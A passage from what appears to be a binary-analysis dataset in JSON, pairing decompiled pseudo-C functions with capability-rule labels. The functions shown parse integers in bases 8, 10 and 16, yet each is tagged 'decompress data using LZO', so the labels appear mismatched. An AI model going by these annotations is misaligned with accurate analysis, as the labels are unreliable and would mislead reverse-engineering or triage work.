0xffff);\n                var_42h = fcn.00450410(&arg_10h);\n                if (var_42h != 0) {\n                    cVar5 = *(iVar7 + 0x10);\n                    uVar19 = 0;\n                    bVar11 = false;\n                    goto code_r0x0046d16a;\n                }\n                uVar17 = fcn.00450500();\n                cVar5 = *(iVar7 + 0x10);\n            }\n        }\n        else {\n            bVar12 = false;\n        }\n        bVar11 = false;\n        uVar19 = 0;\n        do {\n            iVar6 = uVar17;\n            if ((cVar5 != '\\0') && (*(iVar7 + 0x26) == iVar6)) {\n                var_42h = 0;\n                if (var_40h != 0x10) goto code_r0x0046d177;\n                var_28h = var_28h & 0xffffff00;\n                var_50h = 0x16;\n                goto code_r0x0046d7f0;\n            }\n            if (*(iVar7 + 0x24) == iVar6) break;\n            if (*(iVar7 + 0x78) == iVar6) {\n                bVar13 = var_40h == 10 | bVar11 ^ 1U;\n                if (!bVar13) goto code_r0x0046d0d2;\n                bVar11 = uVar18 == 0 || var_40h == 8;\n                if (uVar18 != 0 && var_40h != 8) {\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0046d106;\n                }\n                uVar19 = 0;\n                var_40h = 8;\n                uVar8 = arg_8h[2];\n                if (uVar8 < arg_8h[3]) goto code_r0x0046d115;\ncode_r0x0046d350:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0046d124;\n                var_48h._0_1_ = true;\n            }\n            else {\n                if (!bVar11) break;\ncode_r0x0046d0d2:\n                if ((*(iVar7 + 0x74) != iVar6) && (*(iVar7 + 0x76) != iVar6)) {\n                    var_42h = 0;\n                    bVar11 = true;\n                    goto code_r0x0046d16a;\n                }\n                var_42h = var_40h == 0x10 || uVar18 == 0;\n                if (var_40h != 0x10 && uVar18 != 0) {\n                    bVar11 = true;\n                    goto code_r0x0046d177;\n                }\n                bVar13 = false;\n                uVar19 = 0;\n                var_40h = 0x10;\ncode_r0x0046d106:\n                uVar8 = arg_8h[2];\n                bVar11 = bVar13;\n                if (arg_8h[3] <= uVar8) goto code_r0x0046d350;\ncode_r0x0046d115:\n                arg_8h[2] = uVar8 + 2;\ncode_r0x0046d124:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar6 = *arg_8h[2];\n                }\n                else {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                }\n                var_48h._0_1_ = false;\n                if (iVar6 == -1) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar13 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar6 = *arg_10h[2];\n                }\n                else {\n                    iVar6 = (**(*arg_10h + 0x24))();\n                }\n                bVar13 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar13 = bVar15;\n                }\n            }\n            if (bVar13 == var_48h._0_1_) {\n                var_42h = 1;\n                cVar5 = *(iVar7 + 0x10);\n                goto code_r0x0046d16a;\n            }\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar5 = *(iVar7 + 0x10);\n        } while (bVar11);\n        var_42h = 0;\n    }\ncode_r0x0046d16a:\n    var_50h = 0x16;\n    if (var_40h != 0x10) {\ncode_r0x0046d177:\n        var_50h = var_40h;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar5 != '\\0') {\ncode_r0x0046d7f0:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004b1bc0(0x20);\n    }\n    uVar4 = var_42h;\n    var_64h = &var_28h;\n    uVar18 = bVar12 + 0x7fffffff;\n    uVar2 = *(iVar7 + 0xa4);\n    if (uVar2 == 0) {\n        if (var_42h == 0) {\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0046d1e1:\n            uVar16 = uVar17;\n            uVar17 = uVar17 & 0xffff;\n            if (var_50h < 0xb) {\n                if ((uVar16 < 0x30) || (var_50h + 0x30U <= uVar16)) goto code_r0x0046d400;\n            }\n            else if (9 < uVar16 - 0x30) goto code_r0x0046d3dd;\n            iVar9 = uVar17 - 0x30;\ncode_r0x0046d205:\n            if (iVar9 != -1) {\n                do {\n                    if (uVar18 / var_40h < var_48h) {\n                        var_43h = 1;\n                        uVar17 = arg_8h[2];\n                        if (uVar17 < arg_8h[3]) goto code_r0x0046d244;\ncode_r0x0046d496:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046d253;\n                        var_4ch._0_1_ = true;\n                    }\n                    else {\n                        var_43h = var_43h | uVar18 - iVar9 < var_48h * var_40h;\n                        var_48h = iVar9 + var_48h * var_40h;\n                        uVar19 = uVar19 + 1;\n                        uVar17 = arg_8h[2];\n                        if (arg_8h[3] <= uVar17) goto code_r0x0046d496;\ncode_r0x0046d244:\n                        arg_8h[2] = uVar17 + 2;\ncode_r0x0046d253:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar6 = *arg_8h[2];\n                        }\n                        else {\n                            iVar6 = (**(*arg_8h + 0x24))();\n                        }\n                        var_4ch._0_1_ = false;\n                        if (iVar6 == -1) {\n                            arg_8h = NULL;\n                            var_4ch._0_1_ = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar15 = arg_10h != NULL && arg_14h == -1;\n                    bVar13 = arg_14h == -1;\n                    if (bVar15) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar6 = *arg_10h[2];\n                        }\n                        else {\n                            iVar6 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar13 = false;\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                            bVar13 = bVar15;\n                        }\n                    }\n                    if (var_4ch._0_1_ == bVar13) {\n                        uVar2 = 1;\n                        goto code_r0x0046d298;\n                    }\n                    uVar17 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0046d1e1;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar17 = *arg_8h[2];\n                    }\n                    else {\n                        uVar17 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar16 = uVar17;\n                    if (uVar16 != 0xffff) goto code_r0x0046d1e1;\n                    arg_8h = NULL;\n                    if (var_50h < 0xb) break;\n                    uVar17 = 0xffff;\ncode_r0x0046d3dd:\n                    if (5 < uVar16 - 0x61) goto code_r0x0046d570;\n                    iVar9 = uVar17 - 0x57;\n                    if (iVar9 == -1) break;\n                } while( true );\n            }\n            goto code_r0x0046d400;\n        }\n        var_43h = 0;\n        var_42h = 0;\n        var_48h = 0;\n        uVar2 = uVar4;\n    }\n    else {\n        if (var_42h == 0) {\n            piVar1 = iVar7 + 0x78;\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0046d5b0:\n            uVar8 = var_2ch;\n            iVar6 = uVar17;\n            if ((*(iVar7 + 0x10) == 0) || (*(iVar7 + 0x26) != iVar6)) {\n                if (iVar6 == *(iVar7 + 0x24)) goto code_r0x0046d400;\n                iVar3 = *piVar1;\n                piVar10 = piVar1;\n                uVar17 = var_50h;\n                while (iVar3 != iVar6) {\n                    piVar10 = piVar10 + 1;\n                    uVar17 = uVar17 - 1;\n                    if (uVar17 == 0) goto code_r0x0046d400;\n                    iVar3 = *piVar10;\n                }\n                iVar9 = piVar10 - piVar1 >> 1;\n                if (0x1e < piVar10 - piVar1) {\n                    iVar9 = iVar9 + -6;\n                }\n                if (var_48h <= uVar18 / var_40h) {\n                    uVar17 = var_48h * var_40h;\n                    var_48h = iVar9 + uVar17;\n                    var_43h = var_43h | uVar18 - iVar9 < uVar17;\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0046d603;\n                }\n                uVar17 = arg_8h[2];\n                var_43h = uVar2;\n                if (uVar17 < arg_8h[3]) goto code_r0x0046d612;\ncode_r0x0046d6d8:\n                (**(*arg_8h + 0x28))();\n                var_56h = uVar2;\n                if (arg_8h != NULL) goto code_r0x0046d621;\n            }\n            else {\n                if (uVar19 == 0) {\n                    var_42h = *(iVar7 + 0x10);\n                    uVar2 = 0;\n                    goto code_r0x0046d298;\n                }\n                uVar17 = var_2ch + 1;\n                uVar14 = 0xf;\n                if (stack0xffffffcc != var_64h) {\n                    uVar14 = var_28h;\n                }\n                if (uVar14 < uVar17) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                *(stack0xffffffcc + uVar8) = uVar19;\n                *(stack0xffffffcc + uVar17) = 0;\n                uVar19 = 0;\n                var_2ch = uVar17;\ncode_r0x0046d603:\n                uVar17 = arg_8h[2];\n                if (arg_8h[3] <= uVar17) goto code_r0x0046d6d8;\ncode_r0x0046d612:\n                arg_8h[2] = uVar17 + 2;\ncode_r0x0046d621:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar6 = *arg_8h[2];\n                }\n                else {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                }\n                var_56h = 0;\n                if (iVar6 == -1) {\n                    arg_8h = NULL;\n                    var_56h = uVar2;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar13 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar6 = *arg_10h[2];\n                }\n                else {\n                    iVar6 = (**(*arg_10h + 0x24))();\n                }\n                bVar13 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar13 = bVar15;\n                }\n            }\n            if (bVar13 == var_56h) goto code_r0x0046d298;\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            goto code_r0x0046d5b0;\n        }\n        var_48h = 0;\n        var_43h = 0;\n        var_42h = 0;\n        uVar2 = uVar4;\n    }\ncode_r0x0046d298:\n    if (var_2ch != 0) goto code_r0x0046d40f;\ncode_r0x0046d2a0:\n    if ((uVar19 != 0) || (bVar11)) {\ncode_r0x0046d451:\n        if (var_42h == 0) {\n            if (var_43h == 0) {\n                uVar18 = -var_48h;\n                if (!bVar12) {\n                    uVar18 = var_48h;\n                }\n                *arg_20h = uVar18;\n            }\n            else {\n                *arg_20h = bVar12 + 0x7fffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0046d2c4;\n        }\n    }\ncode_r0x0046d2b2:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0046d2c4:\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_64h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x0046d570:\n    if (5 < uVar16 - 0x41) goto code_r0x0046d400;\n    iVar9 = uVar17 - 0x37;\n    goto code_r0x0046d205;\ncode_r0x0046d400:\n    uVar2 = 0;\n    if (var_2ch == 0) goto code_r0x0046d2a0;\ncode_r0x0046d40f:\n    fcn.004b20a0(uVar19);\n    cVar5 = fcn.004bdf20(*(iVar7 + 8), *(iVar7 + 0xc), &var_31h + 1);\n    if (cVar5 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar11) || ((uVar19 | var_2ch) != 0)) goto code_r0x0046d451;\n    goto code_r0x0046d2b2;\n}\n",
        "token_count": 5175
    },
    "0046da50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046da50(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    char cVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    bool bVar10;\n    bool bVar11;\n    bool bVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    bool bVar15;\n    uint16_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint *var_60h;\n    uint var_5ch;\n    uint var_57h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint8_t var_43h;\n    uint8_t var_42h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar4 = arg_18h;\n    iVar8 = fcn.0044daf0(arg_18h + 0x6c);\n    var_40h = 8;\n    uVar18 = *(iVar4 + 0xc) & 0x4a;\n    if ((uVar18 != 0x40) && (var_40h = 10,  uVar18 == 8)) {\n        var_40h = 0x10;\n    }\n    bVar11 = arg_8h != NULL && arg_ch == -1;\n    bVar10 = arg_ch == -1;\n    if (bVar11) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar7 = *arg_8h[2];\n        }\n        else {\n            iVar7 = (**(*arg_8h + 0x24))();\n        }\n        bVar10 = false;\n        if (iVar7 == -1) {\n            arg_8h = NULL;\n            bVar10 = bVar11;\n        }\n    }\n    bVar12 = arg_10h != NULL && arg_14h == -1;\n    bVar11 = arg_14h == -1;\n    if (bVar12) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar7 = *arg_10h[2];\n        }\n        else {\n            iVar7 = (**(*arg_10h + 0x24))();\n        }\n        bVar11 = false;\n        if (iVar7 == -1) {\n            arg_10h = NULL;\n            bVar11 = bVar12;\n        }\n    }\n    if (bVar11 == bVar10) {\n        cVar6 = *(iVar8 + 0x10);\n        bVar11 = false;\n        uVar17 = 0;\n        uVar19 = 0;\n        var_42h = 1;\n        bVar10 = false;\n    }\n    else {\n        uVar17 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar17 = *arg_8h[2];\n            }\n            else {\n                uVar17 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar17 == -1) {\n                arg_8h = NULL;\n            }\n        }\n        cVar6 = *(iVar8 + 0x10);\n        iVar7 = uVar17;\n        bVar11 = *(iVar8 + 0x70) == iVar7;\n        if ((bVar11) || (*(iVar8 + 0x72) == iVar7)) {\n            if (((cVar6 == '\\0') || (*(iVar8 + 0x26) != iVar7)) && (*(iVar8 + 0x24) != iVar7)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                var_42h = fcn.00450410(&arg_10h);\n                if (var_42h != 0) {\n                    cVar6 = *(iVar8 + 0x10);\n                    uVar19 = 0;\n                    bVar10 = false;\n                    goto code_r0x0046dc2a;\n                }\n                uVar17 = fcn.00450500();\n                cVar6 = *(iVar8 + 0x10);\n            }\n        }\n        else {\n            bVar11 = false;\n        }\n        bVar10 = false;\n        uVar19 = 0;\n        do {\n            iVar7 = uVar17;\n            if ((cVar6 != '\\0') && (*(iVar8 + 0x26) == iVar7)) {\n                var_42h = 0;\n                if (var_40h != 0x10) goto code_r0x0046dc37;\n                var_28h = var_28h & 0xffffff00;\n                var_50h = 0x16;\n                goto code_r0x0046e2a0;\n            }\n            if (*(iVar8 + 0x24) == iVar7) break;\n            if (*(iVar8 + 0x78) == iVar7) {\n                bVar12 = var_40h == 10 | bVar10 ^ 1U;\n                if (!bVar12) goto code_r0x0046db92;\n                bVar10 = uVar18 == 0 || var_40h == 8;\n                if (uVar18 != 0 && var_40h != 8) {\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0046dbc6;\n                }\n                uVar19 = 0;\n                var_40h = 8;\n                uVar14 = arg_8h[2];\n                if (uVar14 < arg_8h[3]) goto code_r0x0046dbd5;\ncode_r0x0046de10:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0046dbe4;\n                var_48h._0_1_ = true;\n            }\n            else {\n                if (!bVar10) break;\ncode_r0x0046db92:\n                if ((*(iVar8 + 0x74) != iVar7) && (*(iVar8 + 0x76) != iVar7)) {\n                    var_42h = 0;\n                    bVar10 = true;\n                    goto code_r0x0046dc2a;\n                }\n                var_42h = var_40h == 0x10 || uVar18 == 0;\n                if (var_40h != 0x10 && uVar18 != 0) {\n                    bVar10 = true;\n                    goto code_r0x0046dc37;\n                }\n                bVar12 = false;\n                uVar19 = 0;\n                var_40h = 0x10;\ncode_r0x0046dbc6:\n                uVar14 = arg_8h[2];\n                bVar10 = bVar12;\n                if (arg_8h[3] <= uVar14) goto code_r0x0046de10;\ncode_r0x0046dbd5:\n                arg_8h[2] = uVar14 + 2;\ncode_r0x0046dbe4:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_48h._0_1_ = false;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar12 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar12 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar12 = bVar15;\n                }\n            }\n            if (var_48h._0_1_ == bVar12) {\n                var_42h = 1;\n                cVar6 = *(iVar8 + 0x10);\n                goto code_r0x0046dc2a;\n            }\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            cVar6 = *(iVar8 + 0x10);\n        } while (bVar10);\n        var_42h = 0;\n    }\ncode_r0x0046dc2a:\n    var_50h = 0x16;\n    if (var_40h != 0x10) {\ncode_r0x0046dc37:\n        var_50h = var_40h;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (cVar6 != '\\0') {\ncode_r0x0046e2a0:\n        stack0xffffffcc = &var_28h;\n        var_2ch = 0;\n        fcn.004b1bc0(0x20);\n    }\n    uVar5 = var_42h;\n    var_60h = &var_28h;\n    uVar18 = 0xffffffff / var_40h;\n    uVar2 = *(iVar8 + 0xa4);\n    if (uVar2 == 0) {\n        if (var_42h == 0) {\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0046dc98:\n            uVar16 = uVar17;\n            uVar17 = uVar17 & 0xffff;\n            if (var_50h < 0xb) {\n                if ((uVar16 < 0x30) || (var_50h + 0x30U <= uVar16)) goto code_r0x0046dec0;\n            }\n            else if (9 < uVar16 - 0x30) goto code_r0x0046de9d;\n            uVar17 = uVar17 - 0x30;\ncode_r0x0046dcbc:\n            if (uVar17 != 0xffffffff) {\n                do {\n                    if (uVar18 < var_48h) {\n                        var_43h = 1;\n                        uVar17 = arg_8h[2];\n                        if (uVar17 < arg_8h[3]) goto code_r0x0046dcfa;\ncode_r0x0046df53:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046dd09;\n                        var_4ch._0_1_ = true;\n                    }\n                    else {\n                        var_43h = var_43h | ~uVar17 < var_48h * var_40h;\n                        var_48h = uVar17 + var_48h * var_40h;\n                        uVar19 = uVar19 + 1;\n                        uVar17 = arg_8h[2];\n                        if (arg_8h[3] <= uVar17) goto code_r0x0046df53;\ncode_r0x0046dcfa:\n                        arg_8h[2] = uVar17 + 2;\ncode_r0x0046dd09:\n                        if (arg_8h[2] < arg_8h[3]) {\n                            iVar7 = *arg_8h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_8h + 0x24))();\n                        }\n                        var_4ch._0_1_ = false;\n                        if (iVar7 == -1) {\n                            arg_8h = NULL;\n                            var_4ch._0_1_ = true;\n                        }\n                    }\n                    arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n                    bVar15 = arg_10h != NULL && arg_14h == -1;\n                    bVar12 = arg_14h == -1;\n                    if (bVar15) {\n                        if (arg_10h[2] < arg_10h[3]) {\n                            iVar7 = *arg_10h[2];\n                        }\n                        else {\n                            iVar7 = (**(*arg_10h + 0x24))();\n                        }\n                        bVar12 = false;\n                        if (iVar7 == -1) {\n                            arg_10h = NULL;\n                            bVar12 = bVar15;\n                        }\n                    }\n                    if (var_4ch._0_1_ == bVar12) {\n                        uVar2 = 1;\n                        goto code_r0x0046dd4e;\n                    }\n                    uVar17 = 0xffff;\n                    if (arg_8h == NULL) goto code_r0x0046dc98;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar17 = *arg_8h[2];\n                    }\n                    else {\n                        uVar17 = (**(*arg_8h + 0x24))();\n                    }\n                    uVar16 = uVar17;\n                    if (uVar16 != 0xffff) goto code_r0x0046dc98;\n                    arg_8h = NULL;\n                    if (var_50h < 0xb) break;\n                    uVar17 = 0xffff;\ncode_r0x0046de9d:\n                    if (5 < uVar16 - 0x61) goto code_r0x0046e020;\n                    uVar17 = uVar17 - 0x57;\n                    if (uVar17 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x0046dec0;\n        }\n        var_43h = 0;\n        var_42h = 0;\n        var_48h = 0;\n        uVar2 = uVar5;\n    }\n    else {\n        if (var_42h == 0) {\n            piVar1 = iVar8 + 0x78;\n            var_43h = 0;\n            var_48h = 0;\ncode_r0x0046e060:\n            uVar14 = var_2ch;\n            iVar7 = uVar17;\n            if ((*(iVar8 + 0x10) == 0) || (*(iVar8 + 0x26) != iVar7)) {\n                if (iVar7 == *(iVar8 + 0x24)) goto code_r0x0046dec0;\n                iVar3 = *piVar1;\n                piVar9 = piVar1;\n                uVar17 = var_50h;\n                while (iVar3 != iVar7) {\n                    piVar9 = piVar9 + 1;\n                    uVar17 = uVar17 - 1;\n                    if (uVar17 == 0) goto code_r0x0046dec0;\n                    iVar3 = *piVar9;\n                }\n                uVar17 = piVar9 - piVar1 >> 1;\n                if (0x1e < piVar9 - piVar1) {\n                    uVar17 = uVar17 - 6;\n                }\n                if (var_48h <= uVar18) {\n                    uVar14 = var_48h * var_40h;\n                    var_48h = uVar17 + uVar14;\n                    var_43h = var_43h | ~uVar17 < uVar14;\n                    uVar19 = uVar19 + 1;\n                    goto code_r0x0046e0b3;\n                }\n                uVar17 = arg_8h[2];\n                var_43h = uVar2;\n                if (uVar17 < arg_8h[3]) goto code_r0x0046e0c2;\ncode_r0x0046e188:\n                (**(*arg_8h + 0x28))();\n                var_57h._1_1_ = uVar2;\n                if (arg_8h != NULL) goto code_r0x0046e0d1;\n            }\n            else {\n                if (uVar19 == 0) {\n                    var_42h = *(iVar8 + 0x10);\n                    uVar2 = 0;\n                    goto code_r0x0046dd4e;\n                }\n                uVar17 = var_2ch + 1;\n                uVar13 = 0xf;\n                if (stack0xffffffcc != var_60h) {\n                    uVar13 = var_28h;\n                }\n                if (uVar13 < uVar17) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                *(stack0xffffffcc + uVar14) = uVar19;\n                *(stack0xffffffcc + uVar17) = 0;\n                uVar19 = 0;\n                var_2ch = uVar17;\ncode_r0x0046e0b3:\n                uVar17 = arg_8h[2];\n                if (arg_8h[3] <= uVar17) goto code_r0x0046e188;\ncode_r0x0046e0c2:\n                arg_8h[2] = uVar17 + 2;\ncode_r0x0046e0d1:\n                if (arg_8h[2] < arg_8h[3]) {\n                    iVar7 = *arg_8h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_8h + 0x24))();\n                }\n                var_57h._1_1_ = 0;\n                if (iVar7 == -1) {\n                    arg_8h = NULL;\n                    var_57h._1_1_ = uVar2;\n                }\n            }\n            arg_ch = CONCAT22(arg_ch._2_2_, 0xffff);\n            bVar15 = arg_10h != NULL && arg_14h == -1;\n            bVar12 = arg_14h == -1;\n            if (bVar15) {\n                if (arg_10h[2] < arg_10h[3]) {\n                    iVar7 = *arg_10h[2];\n                }\n                else {\n                    iVar7 = (**(*arg_10h + 0x24))();\n                }\n                bVar12 = false;\n                if (iVar7 == -1) {\n                    arg_10h = NULL;\n                    bVar12 = bVar15;\n                }\n            }\n            if (bVar12 == var_57h._1_1_) goto code_r0x0046dd4e;\n            uVar17 = 0xffff;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar17 = *arg_8h[2];\n                }\n                else {\n                    uVar17 = (**(*arg_8h + 0x24))();\n                }\n                if (uVar17 == -1) {\n                    arg_8h = NULL;\n                }\n            }\n            goto code_r0x0046e060;\n        }\n        var_48h = 0;\n        var_43h = 0;\n        var_42h = 0;\n        uVar2 = uVar5;\n    }\ncode_r0x0046dd4e:\n    if (var_2ch != 0) goto code_r0x0046decf;\ncode_r0x0046dd60:\n    if ((uVar19 != 0) || (bVar10)) {\ncode_r0x0046df11:\n        if (var_42h == 0) {\n            if (var_43h == 0) {\n                uVar18 = -var_48h;\n                if (!bVar11) {\n                    uVar18 = var_48h;\n                }\n                *arg_20h = uVar18;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x0046dd84;\n        }\n    }\ncode_r0x0046dd72:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x0046dd84:\n    if (uVar2 != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != var_60h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x0046e020:\n    if (5 < uVar16 - 0x41) goto code_r0x0046dec0;\n    uVar17 = uVar17 - 0x37;\n    goto code_r0x0046dcbc;\ncode_r0x0046dec0:\n    uVar2 = 0;\n    if (var_2ch == 0) goto code_r0x0046dd60;\ncode_r0x0046decf:\n    fcn.004b20a0(uVar19);\n    cVar6 = fcn.004bdf20(*(iVar8 + 8), *(iVar8 + 0xc), &var_31h + 1);\n    if (cVar6 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar10) || ((uVar19 | var_2ch) != 0)) goto code_r0x0046df11;\n    goto code_r0x0046dd72;\n}\n",
        "token_count": 5149
    },
    "0046e500": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0046e500(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint16_t *arg_20h)\n\n{\n    int16_t *piVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    char cVar7;\n    bool bVar8;\n    int16_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int16_t *piVar13;\n    bool bVar14;\n    uint16_t uVar15;\n    uint8_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint var_5ch;\n    uint *var_58h;\n    uint var_54h;\n    uint32_t var_4fh;\n    uint var_48h;\n    uint16_t var_44h;\n    uint8_t var_42h;\n    uint32_t var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_bp_ch;\n    \n    iVar12 = arg_18h;\n    iVar10 = fcn.0044daf0(arg_18h + 0x6c);\n    var_40h = 8;\n    uVar18 = *(iVar12 + 0xc) & 0x4a;\n    if ((uVar18 != 0x40) && (var_40h = 10,  uVar18 == 8)) {\n        var_40h = 0x10;\n    }\n    bVar4 = arg_8h != NULL && arg_ch == -1;\n    bVar14 = arg_ch == -1;\n    if (bVar4) {\n        if (arg_8h[2] < arg_8h[3]) {\n            iVar9 = *arg_8h[2];\n        }\n        else {\n            iVar9 = (**(*arg_8h + 0x24))();\n        }\n        bVar14 = false;\n        if (iVar9 == -1) {\n            arg_8h = NULL;\n            bVar14 = bVar4;\n        }\n    }\n    bVar4 = arg_10h != NULL && arg_14h == -1;\n    bVar5 = arg_14h == -1;\n    if (bVar4) {\n        if (arg_10h[2] < arg_10h[3]) {\n            iVar9 = *arg_10h[2];\n        }\n        else {\n            iVar9 = (**(*arg_10h + 0x24))();\n        }\n        bVar5 = false;\n        if (iVar9 == -1) {\n            arg_10h = NULL;\n            bVar5 = bVar4;\n        }\n    }\n    if (bVar5 == bVar14) {\n        cVar7 = *(iVar10 + 0x10);\n        bVar4 = false;\n        uVar17 = 0;\n        uVar19 = 0;\n        var_42h = 1;\n        bVar14 = false;\n    }\n    else {\n        uVar17 = arg_ch & 0xffff;\n        if ((arg_8h != NULL) && (arg_ch == -1)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar17 = *arg_8h[2];\n            }\n            else {\n                uVar17 = (**(*arg_8h + 0x24))();\n            }\n            if (uVar17 == -1) {\n                arg_8h = 